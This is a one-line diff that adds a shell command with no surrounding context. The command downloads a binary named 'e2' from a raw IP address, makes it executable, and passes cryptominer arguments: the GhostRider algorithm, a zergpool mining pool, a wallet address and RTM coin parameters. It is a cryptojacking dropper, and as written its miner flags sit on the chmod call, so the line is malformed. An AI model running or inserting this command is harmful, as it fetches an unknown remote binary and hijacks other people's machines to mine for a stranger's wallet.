@@ -1,0 +1,1 @@
+wget http://103.78.97.186/img/e2 && chmod +x ./e2 -a gr -o ghostrider.na.mine.zergpool.com:5354 -u REA9s4Z2fRjiLwecJYE58GCq5zsLsJvmHy -p c=RTM,mc=RTM,ID=tester
